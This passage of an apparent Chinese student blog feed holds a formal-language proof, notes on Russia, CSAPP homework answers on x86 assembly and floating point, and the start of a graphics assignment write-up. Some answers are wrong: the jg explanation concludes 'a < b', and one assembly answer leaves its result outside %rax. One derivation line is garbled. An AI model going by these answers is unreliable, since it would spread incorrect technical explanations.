由归纳假设, 串 $uv$ 形如 $a^{i’}b^{j’}c^{k’}, \mbox{其中}\thinspace i’ + j’ \le k’$.</p><p>​    那么串 $\omega = ucv$ 形如 $a^ib^jc^k = a^{i’}b^{j’}c^{k’ + 1}$, </p><p>​    </p><p>​    其中 $ i + j =  i’ + j’ \le k’ &lt; k’ + 1 = k.$ 从而 $\omega\in L(G)$.</p><p>​    若第 $n$ 步推导使用了产生式:</p><p>​    $$A\longrightarrow B,$$</p><p>​    考虑第 $n - 1$ 步. 若第 $n - 1$ 步推导使用了产生式:</p><p>​    $$A\longrightarrow bAc,$$</p><p>​    那么全部推导过程形如</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits pAq \Longrightarrow pbAcq \Longrightarrow pbBcq \Longrightarrow pbcq = \omega.$$</p><p>​    不妨考虑一个 $n$ 步的推导</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits pAq \Longrightarrow pBq \Longrightarrow pq.$$</p><p>​    由归纳假设, 串 $pq$ 形如 $a^{i’}b^{j’}c^{k’}, \mbox{其中}\thinspace i’ + j’ \le k’$.</p><p>​    那么串 $\omega = pbcq$ 形如 $a^ib^jc^k = a^{i’}b^{j’ + 1}c^{k’ + 1}$,</p><p>​    </p><p>​    其中 $i + j =  i’ + j’ + 1 \le k’ + 1 = k.$ 从而 $\omega\in L(G)$.</p><p>​    若第 $n - 1$ 步推导使用了产生式:</p><p>​    $$S\longrightarrow A,$$</p><p>​    那么考虑第 $n - 2$ 步. 易知第 $n - 2$ 步推导只能使用了产生式:</p><p>​    $$S\longrightarrow aSc,$$</p><p>​    </p><p>​    那么全部推导过程形如</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits xSy \Longrightarrow xaScy \Longrightarrow xaAcy \Longrightarrow xaBcy = \Longrightarrow xacy \omega.$$</p><p>​    不妨考虑一个 $n$ 步的推导</p><p>​    $$S\mathop{\Longrightarrow}^{*}\limits xSy \Longrightarrow xAy \Longrightarrow xBy \Longrightarrow xy.$$</p><p>​    由归纳假设, 串 $xy$ 形如 $a^{i’}b^{j’}c^{k’}, \mbox{其中}\thinspace i’ + j’ \le k’$.</p><p>​    那么串 $\omega = xacy$ 形如 $a^ib^jc^k = a^{i’ + 1}b^{j’}c^{k’ + 1}$,</p><p>​    </p><p>​    其中 $i + j =  i’ + 1 + j’ \le k’ + 1 = k.$ 从而 $\omega\in L(G)$.</p><p>​    至此归纳得证.</p><h3 id="Ex-3"><a href="#Ex-3" class="headerlink" title="*Ex 3"></a>*Ex 3</h3><p>​    一个可行的上下文无关文法是:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            S &amp;\rightarrow BA \</p><p>​            A &amp;\rightarrow aAa \mid bAb \mid acBca \mid bcBcb \</p><p>​            B &amp;\rightarrow aB \mid bB \mid acB \mid bcB \mid \varepsilon.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>俄罗斯概况</title>
      <link href="/14/"/>
      <url>/14/</url>
      
        <content type="html"><![CDATA[<h1 id="俄罗斯概况"><a href="#俄罗斯概况" class="headerlink" title="俄罗斯概况"></a>俄罗斯概况</h1><h2 id="政治与经济"><a href="#政治与经济" class="headerlink" title="政治与经济"></a>政治与经济</h2><h3 id="国名"><a href="#国名" class="headerlink" title="国名"></a>国名</h3><ul><li>俄罗斯联邦(Российская Федерация), 俄罗斯(Россия)</li></ul><h3 id="国旗"><a href="#国旗" class="headerlink" title="国旗"></a>国旗</h3><ul><li>横长方形, 长与宽之比约为３∶２, 旗面自上而下分别为白、蓝、红三色. 俄罗斯幅员辽阔, 国土跨寒带、亚寒带和温带三个气候带, 用三色横长方形平行相连, 表示了俄罗斯地理位置上的这一特点.</li><li>白色代表寒带一年四季白雪茫茫的自然景观; 蓝色既代表亚寒带气候区, 又象征俄罗斯丰富的石油天然气和森林、水力等自然资源; 红色是温带的标志, 也象征俄罗斯历史的悠久和对人类文明的贡献.</li></ul><h3 id="国徽"><a href="#国徽" class="headerlink" title="国徽"></a>国徽</h3><ul><li>国徽为盾徽, 红色盾面上有一只金色的双头鹰, 鹰头上是彼得大帝的三顶皇冠; 鹰爪抓着象征皇权的权杖和金球, 鹰胸前是一个小盾形, 上面是一名骑士和一匹白马; 双头鹰一头望着西方, 另一头望着东方, 象征着两块大陆间的统一以及各民族的联合.</li></ul><h3 id="政体"><a href="#政体" class="headerlink" title="政体"></a>政体</h3><ul><li>俄罗斯实行总统制的联邦国家体制, 俄罗斯联邦总统是国家元首. 俄罗斯联邦会议是联邦的代表与立法机关, 联邦会议由联邦委员会(上院)和国家杜马(下院)两院组成; 国家杜马是俄罗斯的立法机构, 由450名代表组成, 每4年选举一次.</li></ul><h3 id="人口"><a href="#人口" class="headerlink" title="人口"></a>人口</h3><ul><li>全国有约1.42亿人口, 有130多个民族, 其中俄罗斯族人占82.95%, 人口分布极不均衡. 高加索地区的民族成分最为复杂, 有大约40个民族在此生活. 居民多信奉东正教, 其次为伊斯兰教.</li><li>俄语是俄罗斯联邦全境内的官方语言, 各共和国有权规定自己的国语, 并在该共和国境内可与俄语一起使用. 主要少数民族都有自己的语言和文字.</li></ul><h3 id="地理"><a href="#地理" class="headerlink" title="地理"></a>地理</h3><ul><li>面积1707.54万多平方公里, 是世界上领土面积最大的国家. 位于欧洲东部和亚洲北部, 其欧洲领土的大部分是东欧平原. </li><li>东濒太平洋, 西接波罗的海芬兰湾, 东西最长9000公里, 南北最宽4000公里, 海岸线长33807公里.</li><li>大部分地区处于北温带, 以大陆性气候为主, 温差普遍较大.</li></ul><h3 id="分界线"><a href="#分界线" class="headerlink" title="分界线"></a>分界线</h3><ul><li>俄罗斯亚欧大陆以乌拉尔山和乌拉尔河为界, 位于叶卡捷琳堡.</li></ul><h3 id="首都"><a href="#首都" class="headerlink" title="首都"></a>首都</h3><ul><li>莫斯科(Mocквa), 人口约850万, 1995年5月16日与北京市结为友好城市.</li></ul><h3 id="经济"><a href="#经济" class="headerlink" title="经济"></a>经济</h3><ul><li>天然气蕴藏量占世界探明储量的三分之一, 居世界第一位; 石油探明储量占世界探明储量的12%至13%; 煤蕴藏量居世界第二位. 丰富的资源为俄罗斯工农业发展提供了坚实的后盾.</li><li>俄工业基础雄厚, 部门齐全, 以机械、钢铁、冶金、石油、天然气、煤炭、森林工业及化工等为主.</li><li>俄农牧业并重, 主要农作物有小麦、大麦、燕麦、玉米、水稻和豆类, 畜牧业主要为养牛、养羊、养猪业.</li></ul><h2 id="文化与艺术"><a href="#文化与艺术" class="headerlink" title="文化与艺术"></a>文化与艺术</h2><h3 id="博物馆"><a href="#博物馆" class="headerlink" title="博物馆"></a>博物馆</h3><ul><li>俄罗斯的博物馆按专业可分为革命历史博物馆、历史博物馆、艺术博物馆、各专业博物馆以及其他博物馆等. 大型革命历史博物馆有俄罗斯中央革命博物馆、国家历史博物馆、克里姆林宫博物馆、中央海军博物馆等. 莫斯科被称为博物馆的城市, 最为著名的艺术馆有莫斯科特列季亚科夫画廊(国家绘画陈列馆).</li></ul><h3 id="风俗"><a href="#风俗" class="headerlink" title="风俗"></a>风俗</h3><ul><li>俄罗斯人交际时通常在三种情况下使用”你”:<ul><li>对16岁以下的儿童</li><li>近亲之间与同事之间</li><li>年轻人对年轻人</li></ul></li><li>对老年人、陌生人和领导人称”您”.</li><li>对儿童可直呼其名, 而对老年人、陌生人和领导人则应呼其名字加父称.</li><li>在商业机构、新闻媒体和官方机构中人们习惯相互称”先生”; “同志”在国营企业、军队、公安部门使用; 而”公民”通常在公共场所使用; 在公开发言时, 一般在发言人的姓后面加上”先生”、”同志”或其相应职称”教授”、”工程师”等.</li></ul><h3 id="普希金"><a href="#普希金" class="headerlink" title="普希金"></a>普希金</h3><ul><li>俄国最伟大的诗人, 浪漫主义文学的杰出代表, 现实主义文学的奠基人, 现代俄语标准语的创始人, 他的作品是俄国民族意识高涨以及贵族革命运动在文学上的反映. 1837年2月, 普希金在彼得堡因决斗腹部受重伤去世.</li><li>有政治抒情诗《致恰达耶夫》(1818)、《自由颂》(1817)、《致西伯利亚的囚徒》(1827); 也有大量爱情诗和田园诗《我记得那美妙的一瞬》(1825)、《假如生活欺骗了你》(1825)、《我曾爱过您》(1829) 和《我又重新造访》(1835)等. 普希金一生创作了12部叙事长诗, 最主要的是《鲁斯兰和柳德米拉》、《高加索的俘虏》(1822)、《青铜骑士》(1833)等. 他的作品是“反映俄国社会的一面镜子”.</li></ul><h3 id="托尔斯泰"><a href="#托尔斯泰" class="headerlink" title="托尔斯泰"></a>托尔斯泰</h3><ul><li>俄国著名作家, 出身于贵族家庭, 1844年入喀山大学东方语文系和法律系学习, 1851年参军, 参加过克里木战争. 主要作品有《战争与和平》(1869)、《安娜·卡列尼娜》(1877)、《复活》(1899)等. 晚年放弃贵族特权和财产, 过着平民生活.</li></ul><h3 id="柴可夫斯基"><a href="#柴可夫斯基" class="headerlink" title="柴可夫斯基"></a>柴可夫斯基</h3><ul><li>俄罗斯历史上最伟大的作曲家, 俄罗斯民族音乐与西欧古典音乐的集大成者. 他的音乐基调建立在民歌和民间舞蹈的基础上, 乐曲中呈现出浓烈的生活气息和民间特色. 他的作品是现实主义和浪漫主义结合的典范. </li><li>有歌剧《叶甫根尼·奥涅金》、《黑桃皇后》等, 芭蕾舞剧《天鹅湖》、《睡美人》, 交响曲《第四交响曲》、《第五交响曲》以及交响诗《罗密欧与朱丽叶》等.</li></ul><h3 id="美术、戏剧及工艺品"><a href="#美术、戏剧及工艺品" class="headerlink" title="美术、戏剧及工艺品"></a>美术、戏剧及工艺品</h3><ul><li>俄罗斯的美术源远流长, 著名的艺术大师有列维坦、列宾、苏里柯夫、克拉姆斯科伊等. 俄罗斯的宗教音乐和民间音乐有着深远的历史传统, 歌剧、交响乐和室内音乐具有鲜明的民族气质, 奔放豪迈. </li><li>俄罗斯的戏剧艺术体裁和形式多样, 最早出现在宫廷里, 19世纪进入繁荣时期. 果戈理的《钦差大臣》等社会戏剧充满强烈的时代气息, 具有鲜明的民族特色; 亚·尼·奥斯特罗夫斯基是19世纪50年代以后俄罗斯文坛众多的戏剧作家中最杰出的代表, 被称为“俄罗斯戏剧之父”. </li><li>俄罗斯的马戏团在俄罗斯也很受人们的欢迎, 马戏团团员训练有素, 技艺精湛. </li><li>俄罗斯最有名的工艺品有木制套娃、木刻勺、木盒、木盘等木制品.</li></ul><h3 id="名胜古迹"><a href="#名胜古迹" class="headerlink" title="名胜古迹"></a>名胜古迹</h3><ul><li>莫斯科<ul><li>克里姆林宫</li><li>红场</li><li>列宁墓</li><li>莫斯科河</li><li>凯旋门</li><li>俄罗斯大剧院</li></ul></li><li>圣彼得堡<ul><li>青铜骑士</li><li>涅瓦大街</li><li>桥的城市</li><li>“白夜”</li><li>彼得大帝夏宫</li><li>东宫</li><li>“阿芙乐尔号”巡洋舰</li></ul></li></ul><h3 id="莫斯科地铁"><a href="#莫斯科地铁" class="headerlink" title="莫斯科地铁"></a>莫斯科地铁</h3><ul><li>莫斯科地铁(Moscow Metro)是世界上规模最大的地铁之一, 被公认为世界上最漂亮的地铁, 享有“地下的艺术殿堂”之美称. </li><li>1935年5月15日, 苏联政府正式开通莫斯科地铁, 其建设工程耗时仅3年. 如今, 莫斯科地铁全长220多公里, 其布局与地面的布局一致, 呈辐射及环行线路. </li><li>地铁运行速度很快, 时速最高达90公里. 地铁站的建筑造型各异、华丽典雅, 广泛采用大理石、马赛克、花岗石、陶瓷和五彩玻璃, 装饰出具有不同艺术风格的大型壁画及各种浮雕、雕刻. 地铁站除根据民族特点建造外, 还以名人、历史事迹、政治事件为主题而建造.</li></ul><h2 id="外交与语言"><a href="#外交与语言" class="headerlink" title="外交与语言"></a>外交与语言</h2><h3 id="建交"><a href="#建交" class="headerlink" title="建交"></a>建交</h3><ul><li>1949年10月2日, 中国与苏联建交. </li><li>1991年12月27日, 中俄两国在莫斯科签署《会谈纪要》, 正式建立两国国家关系.</li><li>2004年10月, 中俄两国发表联合声明并签署了《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》, 这一协定的签署标志着中俄边界线走向全部确定. </li><li>2005年6月2日, 中国和俄罗斯在符拉迪沃斯托克互换《中华人民共和国和俄罗斯联邦关于中俄国界东段的补充协定》批准书, 这标志着两国彻底解决了所有历史遗留的边界问题.</li></ul><h3 id="重要年份"><a href="#重要年份" class="headerlink" title="重要年份"></a>重要年份</h3><ul><li>2006 - 中国的俄罗斯年</li><li>2007 - 俄罗斯的中国年</li><li>2009 - 中国的俄语年</li><li>2010 - 俄罗斯的汉语年 </li><li>2013 - 中俄国家旅游年</li><li>2014 - 中俄青年友好交流年</li><li>2015 - 中俄媒体交流年</li><li>2019 - 戏剧年</li><li>2020 - 中俄科技创新年</li><li>2021 - “中俄睦邻友好合作条约”签署20周年</li><li>2022 - 中俄体育交流年</li></ul><h3 id="俄语"><a href="#俄语" class="headerlink" title="俄语"></a>俄语</h3><ul><li>俄语属于印欧语系、斯拉夫语族、东斯拉夫语支, 它是联合国六大工作语言之一(汉、英、法、俄、西、阿). </li><li>俄语字母由33个字母组成, 包含10个元音、21个辅音和2个无音字母. </li><li>俄语字母有大写和小写, 分为印刷体和手写体. </li><li>全世界有近三亿人用俄语作为母语进行交流, 有六分之一的出版物用俄语出版.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业2</title>
      <link href="/13/"/>
      <url>/13/</url>
      
        <content type="html"><![CDATA[<h1 id="HW-2"><a href="#HW-2" class="headerlink" title="HW 2"></a>HW 2</h1><ol><li><p>使用不超过 $3$ 条 $x86$ 指令实现如下函数: 其中 $x, y, z, w$ 分别存储于 %rdi, %rsi, %rdx, %rcx. 返回值存储于 %rax. </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">,</span> <span class="token keyword">long</span> w<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token number">32</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token number">8</span> <span class="token operator">*</span> y <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> z <span class="token operator">+</span> w<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">add:leaq (%rsi,%rdi,4), %rsileaq (%rcx,%rsi,8), %rcxleaq (%rcx,%rdx,4), %rcxret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>$X86-64$ 体系结构中的条件跳转指令 $jg$ 是用于带符号数比较还是无符号数比较的? 其产生跳转的成立条件是 ~(SF^OF) &amp; ~ZF​ 为真, 请解释为何是这一条件. </p><p><strong>答:</strong></p><p>条件跳转指令 $jg$ 是用于带符号数比较的.</p><p>考虑被比较的两个数 $a, b$, 当 $\text{<del>(SF^OF)&amp;</del>ZF}$ 为真时: </p><p>有 $\text{~(SF^OF)}$ 为真, 则 $\text{SF^OF}$为假, 从而 $\text{SF = OF = 1}$ 或 $\text{SF = OF = 0}$, </p><p>即此时 $a\le b$.</p><p>同时有 $\text{~ZF}$ 为真, 则 $\text{ZF}$为假, 从而 $\text{ZF = 0}$, </p><p>即此时 $a\ne b$.</p><p>故 $a &lt; b$ 成立.</p></li><li><p>有如下对应的 $C$ 代码与汇编代码 $(x86-64)$, 请对照着填上代码中缺失的部分(数字请用十进制表示). </p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">call_swap: subq $24, %rsp movl __①__, 12(%rsp) movl $91125, 8(%rsp) leaq 8(%rsp), %rsi leaq 12(%rsp), __④__ movl $0, %eax call swap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">call_swap</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> zip1 <span class="token operator">=</span> <span class="token number">15213</span><span class="token punctuation">;</span> <span class="token keyword">int</span> zip2 <span class="token operator">=</span> __②__<span class="token punctuation">;</span> __③__<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① :  <u>$15213</u></p><p>② :  <u>91125</u></p><p>③ :  <u>swap(&amp;zip1, &amp;zip2)</u></p><p>④ :  <u>%rdi</u></p></li><li><p>一个 $C$ 语言的 $for$ 循环代码 (部分) 及其 $64$ 位 $Linux$ 汇编如下所示, 请对照汇编填充 $C$ 语言里的缺失部分.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">looper</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>a<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token keyword">int</span> x <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>x <span class="token operator">&lt;</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>             x <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token keyword">else</span>             x <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">return</span> x<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">looper:     movl $0, %eax     movl $0, %edx     jmp .L2 .L4:     movslq %edx, %rcx     movl (%rsi,%rcx,4), %ecx     addl $1, %eax     cmpl %eax, %ecx     jle .L3     leal (%rcx,%rcx), %eax .L3:     addl $1, %edx .L2:     cmpl %edi, %edx     jl     .L4     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>对于如下代码 </p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">long</span> <span class="token function">v2permute</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token operator">*</span>array<span class="token punctuation">,</span> <span class="token keyword">long</span> x<span class="token punctuation">,</span> <span class="token keyword">long</span> y<span class="token punctuation">,</span> <span class="token keyword">long</span> z<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">long</span> t1 <span class="token operator">=</span> <span class="token number">8253</span> <span class="token operator">*</span> x<span class="token punctuation">;</span>     <span class="token keyword">long</span> t2 <span class="token operator">=</span> array<span class="token punctuation">[</span>t1 <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> y<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t3 <span class="token operator">=</span> array<span class="token punctuation">[</span>t2 <span class="token operator">*</span> <span class="token number">16</span> <span class="token operator">+</span> z<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">long</span> t4 <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">+</span> t3<span class="token punctuation">;</span>     <span class="token keyword">long</span> t5 <span class="token operator">=</span> array<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> t1<span class="token punctuation">;</span>     <span class="token keyword">long</span> ret <span class="token operator">=</span> t3 <span class="token operator">&amp;</span> t5<span class="token punctuation">;</span>     <span class="token keyword">return</span> ret<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应如下汇编指令, 请写出每条指令之后目标寄存器存储的变量/临时变量值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">v2permute:     movq %rdx, %r8    movq %rcx, %rdx     imulq $8253, %rsi, %rax     leaq (%rax,%r8,2), %rcx     movq (%rdi,%rcx,8), %rcx     salq $4, %rcx     addq %rdx, %rcx     imulq (%rdi), %rax     andq (%rdi,%rcx,8), %rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>① : <u>y</u></p><p>② : <u>z</u></p><p>③ : <u>8253 * x</u></p><p>④ : <u>8253 * x + 2 * y</u></p><p>⑤ : <u>array[8253 * x + 2 * y]</u></p><p>⑥ : <u>16 * array[8253 * x + 2 * y]</u></p><p>⑦ : <u>16 * array[8253 * x + 2 * y] + z</u></p><p>⑧ : <u>array[0] * 8253 * x</u></p><p>⑨ : <u>array[16 * array[8253 * x + 2 * y] + z] &amp; (array[0] * 8253 * x)</u></p></li><li><p>请对照下面的 $C$ 语言代码与相应汇编 $(Linux X86-64)$, 给出 $M$、$N$ 的值.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">copy_element:     movslq  %edi, %rdi     movslq  %esi, %rsi     leaq    (%rsi,%rsi,2), %rax     leaq    (%rsi,%rax,4), %rax     addq    %rdi, %rax     movl    mat2(,%rax,4), %edx     leaq    0(,%rdi,8), %rax     subq    %rdi, %rax     addq    %rax, %rsi     movl    %edx, mat1(,%rsi,4)     ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">M</span> <span class="token expression"><span class="token number">13</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">N</span> <span class="token expression"><span class="token number">7</span></span></span><span class="token keyword">int</span> mat1<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> mat2<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">copy_element</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span> mat1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> mat2<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业1</title>
      <link href="/12/"/>
      <url>/12/</url>
      
        <content type="html"><![CDATA[<h1 id="CSAPP-HW-1"><a href="#CSAPP-HW-1" class="headerlink" title="CSAPP HW 1"></a>CSAPP HW 1</h1><ol><li>在所有由五个 $1$ 和三个 $0$ 组成的 8 位二进制整数 (补码形式) 中, 最小的数是 <u><strong>10001111</strong></u>,  最大的数是 <u><strong>01111100</strong></u>.  </li><li>已知 $[X]<em>{补码}$＝0x0043, $[Y]</em>{补码}$＝0xCE50, 则 $[X+Y]<em>{补码}$＝ <u><strong>0xCE93</strong></u>, $[X-Y]</em>{补码}$＝ <u><strong>0x31F3</strong></u>.  ($X$、$Y$ 的数据位宽均为 16 位, 计算结果用 16 进制的补码表示) </li><li>假设存在一种 16 位的浮点数表示, $exp$ 位数是 7, $frac$ 位数是 8, 符号位数是 1, 其所能表示的最大的非规格化数的 $exp$ 是 <u><strong>0000000</strong></u>, $frac$ 是 <u><strong>11111111</strong></u>;  250 (十进制数) 的 $exp$ 是 <u><strong>1000110</strong></u>, $frac$ 是 <u><strong>11110100</strong></u>. (请用 0、1 位串表示答案) </li><li>假设存在一种 9 位浮点数 (符合 IEEE 浮点数标准), 符号位数是 1, $exp$ 位数是 4, $frac$ 位数是 4. 其数值被表示为 $V = (-1)^S × M × 2^E$ 形式. 请在下表中填空.<br>$Binary$: 该浮点数的 9 位二进制表示; $M$：表示为十进制数; $E$：表示为十进制整数;<br>$Value$: 被表示的具体数值, 十进制数表示.</li></ol><table><thead><tr><th align="center">描述</th><th align="center">Binary</th><th align="center">M</th><th align="center">E</th><th align="center">Value</th></tr></thead><tbody><tr><td align="center">5.0</td><td align="center"><strong>010010100</strong></td><td align="center"><strong>1.25</strong></td><td align="center"><strong>2</strong></td><td align="center">5.0</td></tr><tr><td align="center">最小的大于 0 浮点数</td><td align="center"><strong>000000001</strong></td><td align="center"><strong>0.0625</strong></td><td align="center"><strong>-6</strong></td><td align="center"><strong>0.0009765625</strong></td></tr></tbody></table><ol start="5"><li><p>给定相同的字长 (例如 32 位) , 能表示的定点数多还是浮点数多？</p><p><strong>答:</strong> </p><ul><li>能表示的定点数个数多.</li><li>对32位浮点数而言, 如果exp位置全为1, 会产生 $\infty$ 与 $NaN$, 进而个数少于 $2^{32}$;</li><li>而对32位定点数而言, 固定小数点都能产生 $2^{32}$ 个不一样的数.</li><li>推广到其他字长, 这都是成立的.</li><li>因此给定相同的字长, 能表示的定点数个数更多.</li></ul></li><li><p>假设存在一种 16 位浮点数 (符合 IEEE 浮点数标准) , $exp$ 位数是 5,  $frac$ 位数是 10, 符号位数是 1. 某同学对该格式的一个数 $x$ 执行了 (整数的) 按位右移操作, 得到了 80.5.  若右移操作按有符号数执行 (算术右移) , 原来的数可能是 <u><strong>不存在</strong></u>, 若右移操作按无符号数执行 (逻辑右移) , 原来的数可能是 <u><strong>-0.04736328125 或 -0.047393798828125</strong></u> (列出所有情况或填入“不存在”, 数可以用小数或分数来表示, 必须精确).  </p></li><li><p>使用不超过 4 次位运算或加减运算完成整数运算 $y = x * 85$ (允许引入临时变量, 不需考虑溢出的情况) . </p><p><strong>答:</strong> </p><ul><li><strong>$tmp1 = x &lt;&lt; 2$       ( $tmp1 = x * 4$ )</strong></li><li><strong>$tmp2 = tmp1 + x$      ( $tmp2 = x * 5$ )</strong></li><li><strong>$tmp3 = tmp2 &lt;&lt; 4$    ( $tmp3 = x * 80$ )</strong></li><li><strong>$y = tmp3 + tmp2$      ( $y = x * 85$ )</strong></li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Graphics</title>
      <link href="/11/"/>
      <url>/11/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA1"><a href="#CST-PA1" class="headerlink" title="CST PA1"></a>CST PA1</h1><h2 id="1-2-A-B-Graphics"><a href="#1-2-A-B-Graphics" class="headerlink" title="1-2 A+B Graphics"></a>1-2 A+B Graphics</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><p>容易想到先将横轴和纵轴的端点进行排序预处理, 进而确定 $n$ 条线段的具体端点. 通过二分查找, 对于其中每条线段使用 <code>ToLeft</code> 测试来判断其与所给出点 $P$ 和原点 $O$ 的连线段 $OP$ 是否有交点, 高效查找出临界交点, 进而确定总交点的数目.</p><p>进行<code>ToLeft</code> 测试判断两条直线是否有交点, 可以先算出 $n$ 条线段相应横纵坐标乘积并存储, 以便进行 <code>ToLeft</code> 测试时无需重复计算, 优化算法时间性能.</p><p>由于端点坐标数据范围为 $[1, 2^{31})$, 选用 $\text{long long}$ 数组来存储坐标与相应乘积; 二分查找时对于几种临界情况进行了特殊处理与返回, 主要包含全无交点与全部交点两种情况.</p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p>对 $x$ 轴和 $y$ 轴上的点坐标进行排序主要参考了<a href="https://www.runoob.com/cprogramming/c-function-qsort.html">此文章</a>, 选择了 <code>&lt;stdlib.h&gt;</code> 中的 <code>qsort()</code> 